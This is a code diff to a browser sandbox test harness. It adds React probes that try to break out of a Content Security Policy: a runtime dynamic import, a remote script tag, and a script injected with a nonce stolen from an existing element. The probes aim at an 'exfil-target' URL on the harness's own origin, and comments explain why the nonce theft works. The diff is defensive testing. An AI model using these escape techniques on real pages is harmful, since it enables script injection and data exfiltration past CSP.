@@ -361,13 +361,17 @@ const components: Record<string, ComponentType> = {
 const tree = browserTreeFixture;
 
 const securitySource = String.raw`
-import React, { useState } from "react";
+import React, { useEffect, useState } from "react";
 
-export default function SecurityProbe({ label, onRun }) {
+export default function SecurityProbe({ label, onRun, exfilOrigin }) {
   const [fetchStatus, setFetchStatus] = useState("not run");
   const [xhrStatus, setXhrStatus] = useState("not run");
   const [socketStatus, setSocketStatus] = useState("not run");
   const [importStatus, setImportStatus] = useState("not run");
+  const [runtimeImportStatus, setRuntimeImportStatus] = useState("not run");
+  const [remoteScriptStatus, setRemoteScriptStatus] = useState("not run");
+  const [stolenNonceStatus, setStolenNonceStatus] = useState("not run");
+  const [violations, setViolations] = useState([]);
   const [parentStatus, setParentStatus] = useState("not run");
   const [actionStatus, setActionStatus] = useState("not run");
   const [navigateStatus, setNavigateStatus] = useState("not run");
@@ -408,13 +412,54 @@ export default function SecurityProbe({ label, onRun }) {
     }
   }
 
+  // A written import() is rewritten by sucrase into the jail's own require, so
+  // it never becomes a module fetch at all. That is the LOADER refusing an
+  // unknown specifier, not CSP — the two mechanisms are asserted separately
+  // because a source rewrite cannot see code built at runtime (below).
   async function probeImport() {
     try {
       await import("https://example.com/mod.js");
       setImportStatus("UNEXPECTED SUCCESS");
     } catch {
-      setImportStatus("FAILURE (CSP)");
+      setImportStatus("FAILURE (jail require)");
     }
+  }
+
+  // The escape a source rewrite cannot reach: the import URL is composed at
+  // runtime, so sucrase never sees it and only script-src can stop it. Every
+  // probe below targets a REAL module on a real origin, so "UNEXPECTED SUCCESS"
+  // means foreign code actually ran in here — not that a request 404'd.
+  const exfilUrl = suffix => exfilOrigin + "/exfil-target.js?" + suffix + "=" + encodeURIComponent(label);
+
+  async function probeRuntimeImport() {
+    try {
+      await new Function("url", "return import(url)")(exfilUrl("import-secret"));
+      setRuntimeImportStatus("UNEXPECTED SUCCESS");
+    } catch {
+      setRuntimeImportStatus("FAILURE (CSP)");
+    }
+  }
+
+  // The escape that actually works: CSP blanks a nonce's content ATTRIBUTE but
+  // the IDL property survives, so same-document code can read the jail's own
+  // nonce off any script element and stamp it on one it injects.
+  function probeStolenNonce() {
+    const stolen = document.querySelector("script")?.nonce ?? "";
+    const tag = document.createElement("script");
+    tag.nonce = stolen;
+    tag.onload = () => setStolenNonceStatus("UNEXPECTED SUCCESS nonce=" + (stolen === "" ? "none" : "stolen"));
+    tag.onerror = () => setStolenNonceStatus("FAILURE (CSP) nonce=" + (stolen === "" ? "none" : "stolen"));
+    tag.src = exfilUrl("nonce-secret");
+    document.head.appendChild(tag);
+  }
+
+  // A classic script element: the other half of what an empty source list denies.
+  function probeRemoteScript() {
+    const tag = document.createElement("script");
+    tag.onload = () => setRemoteScriptStatus("UNEXPECTED SUCCESS");
+    tag.onerror = () => setRemoteScriptStatus("FAILURE (CSP)");
+    tag.src = exfilUrl("script-secret");
+    document.head.appendChild(tag);
   }
 
   function probeParent() {
@@ -458,6 +503,14 @@ export default function SecurityProbe({ label, onRun }) {
     setActionStatus("delivered");
   }
 
+  // The block is asserted from the browser's own report, not only from a caught
+  // rejection: a rejected import could mean the request left and then 404'd.
+  useEffect(() => {
+    const record = event => setViolations(seen => [...seen, event.effectiveDirective]);
+    document.addEventListener("securitypolicyviolation", record);
+    return () => document.removeEventListener("securitypolicyviolation", record);
+  }, []);
+
   return <section
     aria-label="Generated security probe"
     style={{ minHeight: "100vh", paddingBottom: 40 }}
@@ -478,6 +531,13 @@ export default function SecurityProbe({ label, onRun }) {
     <output id="socket-status">socket: {socketStatus}</output>
     <button type="button" onClick={probeImport}>Probe import</button>
     <output id="import-status">import: {importStatus}</output>
+    <button type="button" onClick={probeRuntimeImport}>Probe runtime import</button>
+    <output id="runtime-import-status">runtime import: {runtimeImportStatus}</output>
+    <button type="button" onClick={probeStolenNonce}>Probe stolen nonce</button>
+    <output id="stolen-nonce-status">stolen nonce: {stolenNonceStatus}</output>
+    <button type="button" onClick={probeRemoteScript}>Probe remote script</button>
+    <output id="remote-script-status">remote script: {remoteScriptStatus}</output>
+    <output id="csp-violations">violations: {violations.join(",")}</output>
     <button type="button" onClick={probeParent}>Probe parent DOM</button>
     <output id="parent-status">parent: {parentStatus}</output>
     <button type="button" onClick={dispatch}>Dispatch action</button>
@@ -570,6 +630,10 @@ const jailTree: UIPayload & { furnishings: Record<string, unknown> } = {
       props: {
         label: "Rendered generated props",
         onRun: { $action: "fn:secure-submit", payload: { invoiceId: "inv_42" } },
+        // A real, reachable origin that is nonetheless NOT in the jail's
+        // script-src (nothing is): the module-loader probes need a target whose
+        // "LOADED" is unambiguous, and the harness is the honest one to use.
+        exfilOrigin: location.origin,
       },
     },
     {
